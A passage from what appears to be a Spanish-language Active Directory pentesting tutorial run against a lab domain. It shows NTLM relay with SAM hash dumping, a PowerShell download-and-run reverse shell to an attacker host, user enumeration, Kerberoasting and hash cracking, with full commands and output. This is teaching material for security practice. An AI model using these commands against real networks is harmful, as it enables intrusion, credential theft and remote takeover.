SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.0.109   445    SARA             [-] SARA\usuario:Password2 STATUS_LOGON_FAILURE 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
```

Aquí podemos ver que `usuario` es privilegiado en `W3-PC`. Esto podría deberse a que `usuario` está en el grupo `Administrators` en dicho host.

Ahora, podemos usar una herramienta llamada [`ntlmrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). Ésta, nos dará la habilidad de añadir un `fichero objetivo`.
Estando dicho fichero en el host `W3-PC`, necesitamos en primer lugar, numerar todos los hosts que están conectados a la red:

```zsh
❯ cme smb 192.168.10.1/24
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.109   445    SARA             [*] Windows 10.0 Build 19041 x64 (name:SARA) (domain:SARA) (signing:False) (SMBv1:False)
```

Podemos ver que nuestro objetivo está conectado a la red (192.168.10.120).

Ponemos en marcha el responder:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FNJO9M3RFSM]
    Responder Domain Name      [BRLS.LOCAL]
    Responder DCE-RPC Port     [48876]

[+] Listening for events...
```

Lanzamos la herramienta `ntlmrelayx`:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Como `usuario` tiene privilegios sobre `cordy`, podemos tomar ventaja de ello para ganar accesoa al recurso inexistente.

Ahora, chequeamos la herramienta `ntlmrelayx`:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, attacking target smb://192.168.10.120
[*] Authenticating against smb://192.168.10.120 as waidroc/usuario SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-7 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
[*] Target system bootKey: 0x9e439fee9a0f33d64ef508d183eafb2f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] SMBD-Thread-8 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
cordy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.10.120
[*] Stopping service RemoteRegistry
```

Hemos conseguido volcar el fichero SAM, pero con `ntlmrelayx` podríamos hacer cosas más interesantes, como ejecutar comandos en la víctima.
Para ello, tendríamos que ganar acceso al host W3-PC y, para hacerlo, seguimos los siguientes pasos:

Primero, clonamos el repositorio [nishang](https://github.com/samratashok/nishang).
Ahora, nos desplazamos hasta el directorio `Shells` y copiamos el script `Invoke-PowerShellTcp.ps1` a nuestro directorio de trabajo.

```zsh
❯ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
                                                                                       
❯ mv Invoke-PowerShellTcp.ps1 PS.ps1
```

Después, en la última línea del script, añadimos nuestra IP y el puerto.

Ahora, iniciamos con python3 un simple servidor web:

```zsh
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

A su vez, nos quedamos en escucha con `netcat`
```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Volvemos a iniciar el `responder` para el envenenamiento de la red:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-GSAPAVAME65]
    Responder Domain Name      [8DXY.LOCAL]
    Responder DCE-RPC Port     [49327]

[+] Listening for events...
```

Iniciamos también la herramienta `ntlmrelayx` con los siguientes parámetros:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.10.106:8080/PS.ps1')"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Por útlimo, en la máquina víctima, abrimos el fichero inexistente que acabamos de poner en el host infectado `PS.ps1`.

Si volvemos a chequear el estado de la herramienta `ntlmrelayx` podríamos ver lo siguiente:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.106:8000/PS.ps1')"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, attacking target smb://192.168.10.120
[*] Authenticating against smb://192.168.10.120 as waidroc/usuario SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
```

Comprobamos la shell donde teníamos `netcat` en ejecución, estando a la escucha, para ver si hemos ganado una reverse shell hacia el host víctima:

```zsh
❯ rlwrap nc -lvnp 4646
listening on [any] 4646 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.10.120] 49788
Windows PowerShell running as user W3-PC$ on W3-PC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> 
```

¡¡HEMOS CONSEGUIDO ACCESO COMO `NT AUTHORITY\SYSTEM` EN W3-PC!!

## Consiguiendo información de los usuarios

- - -

Muchas veces los usuarios ponen información sensible en sus propias descripciones de usuario, como contraseñas, emails (realizar futuro phising para conseguir contraseña), números de teléfono (futuro ataque de ingeniería social)... Por eso, necesitamos enumerar todo para conseguir la mayor información posible.

Si una sesión null de `rpcclient` está disponible, deberías de apagarla **ahora**. Si no esta disponible, estaría mejor, pero siempre corremos el riesgo de que un ataque tenga o consiga las credenciales para poder iniciar la conexión.

Como ejemplo, pongamos que un usuario llamado `mrincognito` tiene una información interesante en su descripción:

```zsh
❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
[Administrator]
[Guest]
[krbtgt]
[cordy]
[usuario]
[mrincognito]
```

También podemos conseguir los IDs de cada uno de los usuarios del sistema (`rid`):

```zsh
❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
0x1f4
0x1f5
0x1f6
0x44f
0x452
0x454
```

Con la siguiente expresión regular, podemos ver toda la información del usuario:

```zsh
❯ for rid in $(rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] For the RID $rid:\n"; rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c "queryuser $rid" | grep -E -i "user name|description" ;done

[+] For the RID 0x1f4:

	User Name   :	Administrator
	Description :	Built-in account for administering the computer/domain

[+] For the RID 0x1f5:

	User Name   :	Guest
	Description :	Built-in account for guest access to the computer/domain

[+] For the RID 0x1f6:

	User Name   :	krbtgt
	Description :	Key Distribution Center Service Account

[+] For the RID 0x44f:

	User Name   :	cordy
	Description :	

[+] For the RID 0x452:

	User Name   :	usuario
	Description :	

[+] For the RID 0x454:

	User Name   :	mrincognito
	Description :	Temporal Password: Mypassword123#
```

Podemos ver que, el usuario `mrincognito` ha dejado una Descripción realmente interesante, la cual nos muestra que la `contraseña temporal es Mypasword123#`.

Intentemos conectarnos vía `evil-winrm`:

```zsh
❯ evil-winrm -i 192.168.10.115 -u mrincognito -p 'Mypassword123#'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mrincognito\Documents> whoami
waidroc\mrincognito
*Evil-WinRM* PS C:\Users\mrincognito\Documents> 
```

En el caso de que este usuario pueda conectase al DC, tendríamos control total sobre la red, por este simple error del usuario.

> En el siguiente recurso, podréis ver como funcionan las conexiones con [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal).
{: .prompt-info}

### Enumerating Admin Groups

- - -

Unas de las cosas que tienes que comprobar si dispones de alguna credencial o una null session vía `rpcclient` es enumerar todos los usuarios administradores en busca de información sensible:

```zsh
❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
	rid:[0x454] attr:[0x7]
	rid:[0x455] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 25 may 2023 17:36:49 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	mar, 23 may 2023 16:39:28 CEST
	Password can change Time :	mié, 24 may 2023 16:39:28 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000020
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x454
	User Name   :	mrincognito
	Full Name   :	Sabina Romero
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Temporal Password: Mypassword123#
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	jue, 25 may 2023 17:11:24 CEST
	Password can change Time :	vie, 26 may 2023 17:11:24 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x455
	User Name   :	svc_sql
	Full Name   :	SVC_SQLService
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	jue, 25 may 2023 17:45:40 CEST
	Password can change Time :	vie, 26 may 2023 17:45:40 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x455
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> 
```

De nuevo, podemos ver que el usuario `mrincognito` tiene la credencial temporal anotada en la descripción.

> Otra forma de ver la misma información de una manera más organizada sería con la herramienta [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump), la cual veremos en el siguiente apartado.
{: .prompt-tip}

## LDAP Enumeration

- - -

```zsh
❯ service apache2 start
                                                                                                                                                                                                                                
❯ python3 /opt/ldapdomaindump/ldapdomaindump.py -u 'waidroc.local\usuario' -p 'Password2' 192.168.10.115
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                                                                
❯ ls
domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```

Podremos ver toda la información sobre usuarios, políticas, hosts, grupos..., en todos los reportes que la herramienta nos ha realizado en formato `html`



## Kerbrute

- - -

La herramienta `kerbrute` es bastante útil ya que, enumera usuarios de dominio por fuerza bruta gracias al protocolo `kerberos`. Se puede instalar directamente en sistemas basados en debian vía apt (`apt-get install kerbrute`).

```zsh
❯ ./kerbrute userenum users --dc dc.waidroc.local -d waidroc.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/25/23 - Ronnie Flathers @ropnop

2023/05/25 19:54:40 >  Using KDC(s):
2023/05/25 19:54:40 >  	dc.waidroc.local:88

2023/05/25 19:54:40 >  [+] VALID USERNAME:	cordy@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	svc_sql@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	usuario@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	Administrator@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	mrincognito@waidroc.local
2023/05/25 19:54:40 >  Done! Tested 7 usernames (5 valid) in 0.033 seconds
```

> Debemos de escoger un buen diccionario para enumerar usuarios potenciales. Un buen repositorio de diccionarios y que uso un montón, es el de [`Seclists`](https://github.com/danielmiessler/SecLists).
{: .prompt-tip}

## Kerberoasting

- - -

![Kroasting](/assets/img/2023-09-01/roasting.png)

El `kerberoasting` es una técnica que podemos utilizar para apuntar a cuentas de servicio en un entorno de Active Directory de Windows. Nos aprovecharíamos de la forma en que funciona la autenticación `Kerberos` para los servicios que utilizan Kerberos para obtener tickets de servicio.

**¿Como funciona el Kerberoasting?**


- Comenzamos `identificando cuentas de servicio` en el entorno de Active Directory. Estas cuentas de servicio se utilizan típicamente para ejecutar diversos servicios o aplicaciones.

- Luego, consultamos el Active Directory en busca de cuentas de servicio que tengan Nombres Principales de Servicio (SPN) asociados. Los `SPN identifican de manera única los servicios registrados en el dominio`.

- Una vez que tenemos una `lista` de cuentas de servicio con `SPN`, solicitamos un ticket de servicio (`TGS`) para cada una de estas cuentas. Hacemos esto utilizando nuestra cuenta de usuario regular y proporcionando el SPN de la cuenta de servicio que queremos atacar.

- El `DC emite un ticket de servicio cifrado` con la contraseña de la cuenta de servicio, la cual no conocemos.

- Extraemos los tickets de servicio cifrados y los guardamos en un `archivo`.

Ahora podemos usar una herramienta como `john` para realizar un `ataque de fuerza bruta a la contraseña` de la cuenta de servicio y obtener la contraseña en `texto plano`.

![IMAGENKR](/assets/img/2023-09-01/imkr.jpg)

Cuando tenemos la contraseña en texto plano, podemos acceder a otros sistemas o servicios que usen las mismas credenciales. Esto puede llevar a una escalada de privilegios adicional y a un movimiento lateral dentro de la red.

Para poder realizar este ataque, debemos de saber **alguna contraseña de cualquier usuario**.
Usaremos la herramienta `impacket-GetSPNs`:

```zsh
❯ impacket-GetUserSPNs waidroc.local/usuario:Password2
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                    Name     MemberOf                                                      PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ------------------------------------------------------------  --------------------------  ---------  ----------
waidroc.local/svc_sql.W2-PC  svc_sql  CN=Group Policy Creator Owners,CN=Users,DC=waidroc,DC=local  2023-05-25 17:45:40.182610  <never>               
```

Teniendo las credenciales de `usuario`, podemos comprobar que el ataque podría realizarse.

Vamos a comprobar si también funciona con el usuario `mrincognito` para asegurarnos que realmente funciona.

```zsh
❯ impacket-GetUserSPNs waidroc.local/mrincognito:Mypassword123#
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                    Name     MemberOf                                                      PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ------------------------------------------------------------  --------------------------  ---------  ----------
waidroc.local/svc_sql.W2-PC  svc_sql  CN=Group Policy Creator Owners,CN=Users,DC=waidroc,DC=local  2023-05-25 17:45:40.182610  <never>               
```

También funciona con `mrincognito`

Ahora, con el parámetro `-request` vamos a solicitar al DC un `TGS`(Ticket Granted Service).

```zsh
❯ impacket-GetUserSPNs waidroc.local/usuario:Password2 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                    Name     MemberOf                                                      PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ------------------------------------------------------------  --------------------------  ---------  ----------
waidroc.local/svc_sql.W2-PC  svc_sql  CN=Group Policy Creator Owners,CN=Users,DC=waidroc,DC=local  2023-05-25 17:45:40.182610  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_sql$waidroc.LOCAL$waidroc.local/svc_sql*$2c96d610678cfd87f24250d68db8087d$06f3d94af90acf738c93783b7496fcc9f9b1414242eb0b9722178db43b895dd7bd1f07952e7e4d65d11387db194b912fb60a9188b69396f6bd79273b2ecee453856e0df06cd1b2f23a4d0af5edf965c974e0d581fea7afbef6df7e94827fe972fa49fb9d3b9692217eb60bb4c1547125827c09a691445a0433bcdbe4f6760a88d30982f501276a98344393eb9874980fbcbd7a7211b2c70d0929a3124219781bffb363884013998de780565e9a14e1961afb04a0de808d4bc963e63432a5374b82114957992fb2b7685e7c8a8399ef89ed04573a465acf11308cbef05d8962beea2b3289fb92a1cd83b9fdbe45631a9150d7754dc56e833da4d30a76c58124db62a2a799849783ab81f9f73c2784a178e7f7f248e1fcf31040c9da328e4ba974cd25e0d54b957d273722a90ab81e86698f105aaba570194757a61d4ed66dd108f65c1f003fd7d812ef522c8485597d3bc2e7f227106e5e469b27a01f345d6dca9fa7657701aa7a3993c2174851b62636d66a94e4b5d21abf45f6f518bbb8e3c02444674354ca13b820c97b176874dec44c619d5152f5f42beb60f9ac1713574c3a51e38929f923207cc4e20e5bd2d03113a0dd5fe15f1ab88fa3aa72af52e64711e3ce2f130ed754393ab0bf0d9b1e109d827aa00dba8cd9c2844be5e84740a1e89b6de79d39dc35caa03d3bd2beae55226786696000ab64c03f3059842929d0f4e14c87605ef0360dba3b2aa15b0a3bbd6cf2b082c096cb99fd0775a9ceda70f7a15e6a3db2646ece1780cc6968c3a4c5c0cda1492f86cf74421084f4fa1a64fa87fc3528517e417e93ae999c4496d6108a3ddd04fa97fd317f8eb376ccd83cd023850240fb4ef0aa55346941f7b7b7b375c5c8b19da86969c1105d220b02887a89b05a6ea072368e2a9e838b09a25792de09fe2c908bf8da778eb25fb5feff431aaa17884ecb1f5602fef3b4960c01768af06ec0c8dc91cdffb43e988af60953b9ee2a0396b23ac968d8d747860a0f5c8e8254df90197fa784d04f458bef30f032c445eca51c048b440663de2d8fd8b4a7b6fbbfeec47578040be4829562374a72e4c35d27c7b789f9e590ac273050820a28111ad5fb91c0c8f572a48311c291b6935cf005c15155eb10ecab80c3264b4b4f6f94dbcb2a8008c65d508007fbd0dd05114edfdecda0bc1b5bdd89580ee63759a316e48307d67e7df245cd577eea19538741382c8c0a97ee25f81a75ed283ed42f99b23231bcadce7f6837854e35811d330a3eb8ca24ff6eee9678d5a4ebe1b7c4c5cad408f55362897a429ecce30638122839a74996873a77272f5a27d5b99fd5c1766676abb35ac4eb1265e6e987abc3123349badfb4288aea016be77c449449c130e48b5c910755b6a843538b0e37fd146c7fb60cd1600001a4c4e583dbe44b45b32323b72f0abcbe892ed32346702a939422bca891d7cb1ae88d006b8bb40c6506705bf98bda5a111d48e9205f5235ceb5bbee94fe0d1f661cefd929a10f18e36d10c0c2c6b5f9a748f8dc6e878268803ddea7991228401a94009f3697436930b58e29c590dc9d79c2550959de4d0a989edf194584b3e363759bdd2fe887d615c299226a0e3c13f1e2ce584fd4aa5598bc54554291aaeadf4e
```

Vamos a intentar crackear el hash obtenido con `John The Ripper`:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mypassword123# (?)
0g 0:00:00:25 DONE (2023-05-25 18:26) 0g/s 559428p/s 559428c/s 559428C/s !!12Honey..*7¡Vamos!
Session completed.
```

Hemos conseguido descifrar el hash y ahora tenemos la contraseña en texto plano `Mypassword123#`. Veamos con `CrackMapExec` si el usuario tiene privilegios de administrador:

```zsh
❯ cme smb 192.168.0.1/24 -u svc_sql -p 'Mypassword123#'
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\svc_sql:Mypassword123# (Pwn3d!)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\svc_sql:Mypassword123# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\svc_sql:Mypassword123# (Pwn3d!)
```
El usuario `svc_sql` es administrador en el DC!


## AS-REP Roast

- - -

Este tipo de ataque consta en buscar usuarios sin requirir `Kerberos pre-auth`.
Esto quiere decir que podemos enviar una petición `AS_REQ` al dominio `waidroc.local` con una lista de usuarios, recibiendo así del servidor una respuesta `AS_REP`. Esta respuesta contiene un hash con las credenciales de los usuarios que había en la lista.

De igual forma que los anteriores ataques, obtendríamos los hashes para posteriormente, crackearlos e intentar tener las credenciales en texto plano.

Vamos a crear la `lista de usuarios`, enumerándolos con la herramienta `rpcclient`, estando autenticados como `usuario`:

```zsh
